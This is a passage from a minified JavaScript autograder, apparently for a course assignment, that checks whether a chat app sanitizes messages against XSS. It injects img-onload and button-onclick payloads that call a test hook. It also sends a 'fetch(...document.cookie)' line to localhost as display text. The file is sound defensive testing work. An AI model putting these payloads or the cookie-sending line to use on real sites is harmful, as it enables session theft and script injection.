                                    await c, v("Attack failed - app is resilient to XSS attack 2A (via onNewMessage)"), e.score += .25
                                } catch (t) {
                                    e.comments.push(x("Attacked successfully - app is still vulnerable to XSS attack 2A (via onNewMessage)"))
                                }
                                k("(Client) Mounting XSS attack via onNewMessage, using a button tag"), a = d(), (c = new Promise((e, t) => {
                                    cpen322.xssTarget = t, setTimeout(() => e(!0), 100)
                                })).finally(() => {
                                    delete cpen322.xssTarget
                                }), l = "attack-" + Math.random().toString().substring(4), i.onNewMessage({
                                    username: a.username,
                                    text: `<button id="${l}" onclick="cpen322.xssTarget(new Error('Invoked code via XSS'))">Click Me</button>`
                                }), (u = document.querySelector("#" + l)) && u.click();
                                try {
                                    await c, v("Attack failed - app is resilient to XSS attack 2B (via onNewMessage)"), e.score += .25
                                } catch (t) {
                                    e.comments.push(x("Attacked successfully - app is still vulnerable to XSS attack 2B (via onNewMessage)"))
                                }
                                k("(Client) Passing a benign payload to onNewMessage"), m = 'alert("This is a benign payload")', a = d(), i.onNewMessage({
                                    username: a.username,
                                    text: m
                                }), (w = (g = Array.from(r.chatElem.querySelectorAll(".message")))[g.length - 1].querySelector(".message-text")).textContent.indexOf(m) < 0 ? e.comments.push(x("Sanitization policy seems too strong, benign text should be displayed", "Text sent: " + m)) : (e.score += .2, v("Users can still write text that looks like code")), k("(Client) Passing a benign payload to onNewMessage"), m = 'fetch("http://localhost:8080?text=" + document.cookie)', a = d(), i.onNewMessage({
                                    username: a.username,
                                    text: m
                                }), (w = (g = Array.from(r.chatElem.querySelectorAll(".message")))[g.length - 1].querySelector(".message-text")).textContent.indexOf(m) < 0 ? e.comments.push(x("Sanitization policy seems too strong, benign text should be displayed", "Text sent: " + m)) : (e.score += .2, v("Users can still write text that looks like code")), k("(Client) Mounting XSS attack via broker, using an img tag"), a = d();
                                let S = new WebSocket(__tester.defaults.webSocketServer),
                                    f = document.createElement("div"),
                                    b = new WebSocket(__tester.defaults.webSocketServer),
                                    C = e => {
                                        let t = JSON.parse(e.data);
                                        f.appendChild(p(`<div>${t.text}</div>`))
                                    };
                                b.addEventListener("message", C), await y(200), (c = new Promise((e, t) => {
                                    cpen322.xssTarget = t, setTimeout(() => e(!0), 1e3)
                                })).finally(() => {
                                    delete cpen322.xssTarget
                                }), S.send(JSON.stringify({
                                    roomId: i.id,
                                    text: '<img src="assets/everyone-icon.png" style="display: none;" onload="cpen322.xssTarget(new Error(\'Invoked code via XSS\'))">'
                                }));
                                try {
                                    await c, v("Attack failed - app is resilient to XSS attack 3A (via broker)"), e.score += .25
                                } catch (t) {
                                    e.comments.push(x("Attacked successfully - app is still vulnerable to XSS attack 3A (via broker)"))
                                }
                                k("(Client) Mounting XSS attack via broker, using a button tag"), (c = new Promise((e, t) => {
                                    cpen322.xssTarget = t, setTimeout(() => e(!0), 1500)
                                })).finally(() => {
                                    delete cpen322.xssTarget
                                }), l = "attack-" + Math.random().toString().substring(4), S.send(JSON.stringify({
                                    roomId: i.id,
                                    text: `<button id="${l}" onclick="cpen322.xssTarget(new Error('Invoked code via XSS'))">Click Me</button>`
                                })), await y(100), (u = document.querySelector("#" + l)) ? u.click() : (u = f.querySelector("#" + l)) && u.click();
                                try {
                                    await c, v("Attack failed - app is resilient to XSS attack 3B (via broker)"), e.score += .25
                                } catch (t) {
                                    e.comments.push(x("Attacked successfully - app is still vulnerable to XSS attack 3B (via broker)"))
                                }
                                k("(Client) Passing a benign payload to broker"), m = 'alert("This is a benign payload 3B")', S.send(JSON.stringify({
                                    roomId: i.id,
                                    text: m
                                })), await y(100), (w = (g = Array.from(r.chatElem.querySelectorAll(".message")))[g.length - 1].querySelector(".message-text")).textContent.indexOf(m) < 0 ? e.comments.push(x("Sanitization policy seems too strong, benign text should be displayed, 3B", "Text sent: " + m)) : (e.score += .2, v("Users can still write text that looks like code")), k("(Client) Passing a benign payload to broker"), m = 'fetch("http://localhost:8080?text=" + document.cookie)', S.send(JSON.stringify({
                                    roomId: i.id,
                                    text: m
                                })), await y(100), (w = (g = Array.from(r.chatElem.querySelectorAll(".message")))[g.length - 1].querySelector(".message-text")).textContent.indexOf(m) < 0 ? e.comments.push(x("Sanitization policy seems too strong, benign text should be displayed 3B2", "Text sent: " + m)) : (e.score += .2, v("Users can still write text that looks like code")), k("(Server) Checking if malicious code gets saved in the database without sanitizing it"), b.removeEventListener("message", C);
                                let E = null;
                                b.addEventListener("message", e => E && E.resolve(JSON.parse(e.data)));
                                let M = '<img src="assets/everyone-icon.png" style="display: none;" onload="cpen322.xssTarget(new Error(\'Invoked code via XSS\'))">',
                                    O = await o("getGlobalObject", "messageBlockSize"),
                                    A = await o("getObjectByString", `messages['${i.id}']`),
                                    j = Array.from({
                                        length: O - A.length
                                    }, e => ({
                                        roomId: i.id,
                                        text: M
                                    }));
                                k("(Server) Sending " + j.length + " test messages, until it fills up a conversation block"), await T.call(j, async (e, t) => {
                                    E = h(), S.send(JSON.stringify(e));
                                    await E.promise
                                }, null, 25), k("(Server) reading the last conversation");
                                let P = (await o("callObjectByString", "db.getLastConversation", i.id)).messages.slice(A.length);
                                if (P.length < 1) e.comments.push(x("No messages were saved in the last conversation"));
                                else {
                                    let t = s(P),
                                        o = document.createElement("div"),
                                        n = new Promise((e, t) => {
                                            cpen322.xssTarget = t, setTimeout(() => e(!0), 1e3)
                                        });
                                    n.finally(() => {
                                        delete cpen322.xssTarget
                                    });
                                    try {
                                        o.appendChild(p(`<div>${t.text}</div>`)), await n, v("Attack failed - app seems to sanitize user input before saving to database"), e.score += .3
                                    } catch (t) {
                                        e.comments.push(x("Attacked successfully - app does not sanitize user input before saving to database"))
                                    }
                                }
                            } else e.comments.push(x('local variable "chatView" inside "main" was not found/exported'));
                    else e.comments.push(x('local variable "lobby" inside "main" was not found/exported'));
                    else e.comments.push(x('Unable to test: local variables inside "main" were not exported'));
                    document.cookie = document.cookie + "; expires=" + (new Date).toUTCString(), await y(50)
                }
                return document.cookie = t, window.location.hash !== n && (window.location.hash = n), e.score = Math.round(100 * e.score) / 100, e
            }
        }], S = String.fromCodePoint(128030), f = String.fromCodePoint(128077), b = (e, t) => {
            let s = document.createElement(e);
            return t && t.appendChild(s), s
        }, y = e => new Promise((t, s) => setTimeout(t, e)), k = (e, ...t) => (C.options.showLogs && console.log("[34m[Tester][0m", e, ...t), e), x = (e, ...t) => (C.options.showLogs && console.log("[34m[Tester][0m %c Bug " + S + " ", "background-color: red; color: white; padding: 1px;", e, ...t), e), v = (e, ...t) => (C.options.showLogs && console.log("[34m[Tester][0m %c OK " + f + " ", "background-color: green; color: white; padding: 1px;", e, ...t), e);

    function T(e, t, s = 0) {
        let o = this,
            n = t || this,
            r = e.bind(n),
            i = async e => e === o.length ? null : (s > 0 && e > 0 && await y(s), await r(o[e], e, o), await i(e + 1));
        return i(0)
    }
    let C = window.localStorage.getItem("store_a5");
    C = C ? JSON.parse(C) : {
        options: {
            showLogs: !0
        },
        selection: {},
        results: {},
        lastTestAt: null
    };
    let E = {},
        M = b("div");
    M.style.position = "fixed", M.style.top = "0px", M.style.right = "0px";
    let O = b("button");
    O.textContent = "Test", O.style.backgroundColor = "red", O.style.color = "white", O.style.padding = "0.5em";
    let A = b("div");
    A.style.padding = "0.5em", A.style.position = "fixed", A.style.right = "0px", A.style.display = "flex", A.style.flexDirection = "column", A.style.backgroundColor = "white", A.style.visibility = "hidden";
    let j = b("div", A),
        P = b("label", j),
        _ = b("input", P);
    _.type = "checkbox", _.checked = !("showLogs" in C.options) || C.options.showLogs, _.addEventListener("change", e => {
        C.options.showLogs = e.target.checked, window.localStorage.setItem("store_a5", JSON.stringify(C))
    }), P.appendChild(document.createTextNode(" Show logs during test"));
    let N = b("table", A);
    N.style.borderCollapse = "collapse";
    let L = b("thead", N);
    L.style.backgroundColor = "dimgray", L.style.color = "white";
    let q = b("tr", L),
        R = b("th", q);
    R.textContent = "Task", R.style.padding = "0.25em";
    let U = b("th", q);
    U.textContent = "Description", U.style.padding = "0.25em";
    let I = b("th", q);
    I.textContent = "Run", I.style.padding = "0.25em";
    let G = b("input", I);
    G.type = "checkbox", G.checked = !!(C.selection && Object.keys(C.selection).length > 0) && Object.values(C.selection).reduce((e, t) => e && t, !0), G.addEventListener("change", e => {
        w.forEach(t => {
            E[t.id].checkBox.checked = e.target.checked, C.selection[t.id] = e.target.checked
        }), window.localStorage.setItem("store_a5", JSON.stringify(C))
    });
    let X = b("th", q);
    X.textContent = "Result", X.style.padding = "0.25em";
    let W = b("tbody", N),
        B = b("tfoot", N),
        J = b("tr", B);
    J.style.borderTop = "1px solid dimgray";
    let D = b("th", J);
    D.textContent = "Total", D.colSpan = 3;
    let H = b("th", J);
    H.textContent = "-";
    let F = () => {
            let e = 0,
                t = 0,
                s = [];
            return w.forEach(o => {
                let n = C.results[o.id];
                e += n.score, t += o.maxScore, n.comments.length > 0 && s.push("Task " + o.id + ":\n" + n.comments.map(e => "  - " + e).join("\n"))
            }), H.textContent = e + "/" + t, {
                sum: e,
                max: t,
                comments: s.join("\n")
            }
        },
        $ = b("button", A);
    $.id = "test-button", $.textContent = "Run Tests";
    let z = b("div", A);
    z.style.fontSize = "0.8em", z.style.textAlign = "right", C.lastTestAt && (F(), z.textContent = "Last Run at: " + new Date(C.lastTestAt).toLocaleString()), w.forEach((e, t) => {
        let s = b("tr", W);
        s.style.backgroundColor = t % 2 == 0 ? "white" : "#eee";
        let o = b("td", s);
        o.textContent = e.id, o.style.textAlign = "center", b("td", s).textContent = e.description;
        let n = b("td", s);
        n.style.textAlign = "center";
        let r = b("input", n);
        r.type = "checkbox", r.checked = e.id in C.selection && C.selection[e.id], r.addEventListener("change", t => {
            C.selection[e.id] = t.target.checked, window.localStorage.setItem("store_a5", JSON.stringify(C))
        });
        let i = b("td", s);
        i.style.textAlign = "center", i.textContent = e.id in C.results ? C.results[e.id].skipped ? "-" : C.results[e.id].score + "/" + e.maxScore : "-", E[e.id] = {
            checkBox: r,
            resultCell: i
        }
    }), M.appendChild(O), M.appendChild(A), $.addEventListener("click", async e => {
        $.disabled = !0, await T.call(w, async e => {
            let t = E[e.id].checkBox,
                s = E[e.id].resultCell;
            if (t.checked) {
                let t;
                $.textContent = "Running Test " + e.id;
                try {
                    k("--- Starting Test " + e.id + " ---"), t = await e.run(), k("--- Test " + e.id + " Finished --- Score = " + Math.round(100 * t.score) / 100 + " / " + e.maxScore), t && t.comments.length > 0 && k("Task " + e.id + ":\n" + t.comments.map(e => "  - " + e).join("\n")), C.results[e.id] = {
                        skipped: !1,
                        score: t ? Math.round(100 * t.score) / 100 : 0,
                        comments: t ? t.comments : []
                    }
                } catch (t) {
                    C.results[e.id] = {
                        skipped: !1,
                        score: 0,
                        comments: ["Error while running tests: " + t.message]
                    }, console.log(t)
                }
                C.options.showLogs && console.log("")
            } else C.results[e.id] = {
                skipped: !0,
                score: 0,
                comments: []
            };
            s.textContent = C.results[e.id].skipped ? "Skipped" : Math.round(100 * C.results[e.id].score) / 100 + "/" + e.maxScore
        });
        let t = F();
        console.log("[34m[Tester][0m", "Total = " + t.sum + " / " + t.max), console.log(t.comments), C.lastTestAt = Date.now(), window.localStorage.setItem("store_a5", JSON.stringify(C)), z.textContent = "Last Run at: " + new Date(C.lastTestAt).toLocaleString(), $.textContent = "Run Tests", $.disabled = !1
    }), O.addEventListener("click", e => "hidden" == A.style.visibility ? A.style.visibility = "visible" : A.style.visibility = "hidden"), document.body.appendChild(M)
});